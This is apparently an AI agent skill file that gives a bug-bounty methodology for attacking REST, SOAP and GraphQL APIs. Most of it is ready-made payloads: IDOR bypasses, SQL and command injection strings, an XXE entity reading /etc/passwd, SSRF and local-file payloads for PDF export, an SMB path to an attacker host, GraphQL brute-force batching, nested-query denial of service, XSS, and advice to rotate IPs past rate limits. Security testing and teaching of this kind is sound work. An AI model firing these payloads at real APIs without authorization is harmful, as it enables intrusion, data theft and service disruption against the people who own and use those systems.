---
name: api-fuzzing-bug-bounty
description: "Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# API Fuzzing for Bug Bounty

## Purpose

Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors.

## Inputs/Prerequisites

- Burp Suite or similar proxy tool
- API wordlists (SecLists, api_wordlist)
- Understanding of REST/GraphQL/SOAP protocols
- Python for scripting
- Target API endpoints and documentation (if available)

## Outputs/Deliverables

- Identified API vulnerabilities
- IDOR exploitation proofs
- Authentication bypass techniques
- SQL injection points
- Unauthorized data access documentation

---

## API Types Overview

| Type | Protocol | Data Format | Structure |
|------|----------|-------------|-----------|
| SOAP | HTTP | XML | Header + Body |
| REST | HTTP | JSON/XML/URL | Defined endpoints |
| GraphQL | HTTP | Custom Query | Single endpoint |

---

## Core Workflow

### Step 1: API Reconnaissance

Identify API type and enumerate endpoints:

```bash
# Check for Swagger/OpenAPI documentation
/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/swagger-ui.html

# Use Kiterunner for API discovery
kr scan https://target.com -w routes-large.kite

# Extract paths from Swagger
python3 json2paths.py swagger.json
```

### Step 2: Authentication Testing

```bash
# Test different login paths
/api/mobile/login
/api/v3/login
/api/magic_link
/api/admin/login

# Check rate limiting on auth endpoints
# If no rate limit → brute force possible

# Test mobile vs web API separately
# Don't assume same security controls
```

### Step 3: IDOR Testing

Insecure Direct Object Reference is the most common API vulnerability:

```bash
# Basic IDOR
GET /api/users/1234 → GET /api/users/1235

# Even if ID is email-based, try numeric
/?user_id=111 instead of /?user_id=user@mail.com

# Test /me/orders vs /user/654321/orders
```

**IDOR Bypass Techniques:**

```bash
# Wrap ID in array
{"id":111} → {"id":[111]}

# JSON wrap
{"id":111} → {"id":{"id":111}}

# Send ID twice
URL?id=<LEGIT>&id=<VICTIM>

# Wildcard injection
{"user_id":"*"}

# Parameter pollution
/api/get_profile?user_id=<victim>&user_id=<legit>
{"user_id":<legit_id>,"user_id":<victim_id>}
```

### Step 4: Injection Testing

**SQL Injection in JSON:**

```json
{"id":"56456"}                    → OK
{"id":"56456 AND 1=1#"}           → OK  
{"id":"56456 AND 1=2#"}           → OK
{"id":"56456 AND 1=3#"}           → ERROR (vulnerable!)
{"id":"56456 AND sleep(15)#"}     → SLEEP 15 SEC
```

**Command Injection:**

```bash
# Ruby on Rails
?url=Kernel#open → ?url=|ls

# Linux command injection
api.url.com/endpoint?name=file.txt;ls%20/
```

**XXE Injection:**

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**SSRF via API:**

```html
<object data="http://127.0.0.1:8443"/>
<img src="http://127.0.0.1:445"/>
```

**.NET Path.Combine Vulnerability:**

```bash
# If .NET app uses Path.Combine(path_1, path_2)
# Test for path traversal
https://example.org/download?filename=a.png
https://example.org/download?filename=C:\inetpub\wwwroot\web.config
https://example.org/download?filename=\\smb.dns.attacker.com\a.png
```

### Step 5: Method Testing

```bash
# Test all HTTP methods
GET /api/v1/users/1
POST /api/v1/users/1
PUT /api/v1/users/1
DELETE /api/v1/users/1
PATCH /api/v1/users/1

# Switch content type
Content-Type: application/json → application/xml
```

---

## GraphQL-Specific Testing

### Introspection Query

Fetch entire backend schema:

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
```

**URL-encoded version:**

```
/graphql?query={__schema{types{name,kind,description,fields{name}}}}
```

### GraphQL IDOR

```graphql
# Try accessing other user IDs
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```

### GraphQL SQL/NoSQL Injection

```graphql
mutation {
  login(input: {
    email: "test' or 1=1--"
    password: "password"
  }) {
    success
    jwt
  }
}
```

### Rate Limit Bypass (Batching)

```graphql
mutation {login(input:{email:"a@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"b@example.com" password:"password"}){success jwt}}
mutation {login(input:{email:"c@example.com" password:"password"}){success jwt}}
```

### GraphQL DoS (Nested Queries)

```graphql
query {
  posts {
    comments {
      user {
        posts {
          comments {
            user {
              posts { ... }
            }
          }
        }
      }
    }
  }
}
```

### GraphQL XSS

```bash
# XSS via GraphQL endpoint
http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}

# URL-encoded XSS
http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
```

### GraphQL Tools

| Tool | Purpose |
|------|---------|
| GraphCrawler | Schema discovery |
| graphw00f | Fingerprinting |
| clairvoyance | Schema reconstruction |
| InQL | Burp extension |
| GraphQLmap | Exploitation |

---

## Endpoint Bypass Techniques

When receiving 403/401, try these bypasses:

```bash
# Original blocked request
/api/v1/users/sensitivedata → 403

# Bypass attempts
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata?
/api/v1/users/sensitivedata/
/api/v1/users/sensitivedata??
/api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09
/api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

---

## Output Exploitation

### PDF Export Attacks

```html
<!-- LFI via PDF export -->
<iframe src="file:///etc/passwd" height=1000 width=800>

<!-- SSRF via PDF export -->
<object data="http://127.0.0.1:8443"/>

<!-- Port scanning -->
<img src="http://127.0.0.1:445"/>

<!-- IP disclosure -->
<img src="https://iplogger.com/yourcode.gif"/>
```

### DoS via Limits

```bash
# Normal request
/api/news?limit=100

# DoS attempt
/api/news?limit=9999999999
```

---

## Common API Vulnerabilities Checklist

| Vulnerability | Description |
|---------------|-------------|
| API Exposure | Unprotected endpoints exposed publicly |
| Misconfigured Caching | Sensitive data cached incorrectly |
| Exposed Tokens | API keys/tokens in responses or URLs |
| JWT Weaknesses | Weak signing, no expiration, algorithm confusion |
| IDOR / BOLA | Broken Object Level Authorization |
| Undocumented Endpoints | Hidden admin/debug endpoints |
| Different Versions | Security gaps in older API versions |
| Rate Limiting | Missing or bypassable rate limits |
| Race Conditions | TOCTOU vulnerabilities |
| XXE Injection | XML parser exploitation |
| Content Type Issues | Switching between JSON/XML |
| HTTP Method Tampering | GET→DELETE/PUT abuse |

---

## Quick Reference

| Vulnerability | Test Payload | Risk |
|---------------|--------------|------|
| IDOR | Change user_id parameter | High |
| SQLi | `' OR 1=1--` in JSON | Critical |
| Command Injection | `; ls /` | Critical |
| XXE | DOCTYPE with ENTITY | High |
| SSRF | Internal IP in params | High |
| Rate Limit Bypass | Batch requests | Medium |
| Method Tampering | GET→DELETE | High |

---

## Tools Reference

| Category | Tool | URL |
|----------|------|-----|
| API Fuzzing | Fuzzapi | github.com/Fuzzapi/fuzzapi |
| API Fuzzing | API-fuzzer | github.com/Fuzzapi/API-fuzzer |
| API Fuzzing | Astra | github.com/flipkart-incubator/Astra |
| API Security | apicheck | github.com/BBVA/apicheck |
| API Discovery | Kiterunner | github.com/assetnote/kiterunner |
| API Discovery | openapi_security_scanner | github.com/ngalongc/openapi_security_scanner |
| API Toolkit | APIKit | github.com/API-Security/APIKit |
| API Keys | API Guesser | api-guesser.netlify.app |
| GUID | GUID Guesser | gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18 |
| GraphQL | InQL | github.com/doyensec/inql |
| GraphQL | GraphCrawler | github.com/gsmith257-cyber/GraphCrawler |
| GraphQL | graphw00f | github.com/dolevf/graphw00f |
| GraphQL | clairvoyance | github.com/nikitastupin/clairvoyance |
| GraphQL | batchql | github.com/assetnote/batchql |
| GraphQL | graphql-cop | github.com/dolevf/graphql-cop |
| Wordlists | SecLists | github.com/danielmiessler/SecLists |
| Swagger Parser | Swagger-EZ | rhinosecuritylabs.github.io/Swagger-EZ |
| Swagger Routes | swagroutes | github.com/amalmurali47/swagroutes |
| API Mindmap | MindAPI | dsopas.github.io/MindAPI/play |
| JSON Paths | json2paths | github.com/s0md3v/dump/tree/master/json2paths |

---

## Constraints

**Must:**
- Test mobile, web, and developer APIs separately
- Check all API versions (/v1, /v2, /v3)
- Validate both authenticated and unauthenticated access

**Must Not:**
- Assume same security controls across API versions
- Skip testing undocumented endpoints
- Ignore rate limiting checks

**Should:**
- Add `X-Requested-With: XMLHttpRequest` header to simulate frontend
- Check archive.org for historical API endpoints
- Test for race conditions on sensitive operations

---

## Examples

### Example 1: IDOR Exploitation

```bash
# Original request (own data)
GET /api/v1/invoices/12345
Authorization: Bearer <token>

# Modified request (other user's data)
GET /api/v1/invoices/12346
Authorization: Bearer <token>

# Response reveals other user's invoice data
```

### Example 2: GraphQL Introspection

```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| API returns nothing | Add `X-Requested-With: XMLHttpRequest` header |
| 401 on all endpoints | Try adding `?user_id=1` parameter |
| GraphQL introspection disabled | Use clairvoyance for schema reconstruction |
| Rate limited | Use IP rotation or batch requests |
| Can't find endpoints | Check Swagger, archive.org, JS files |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
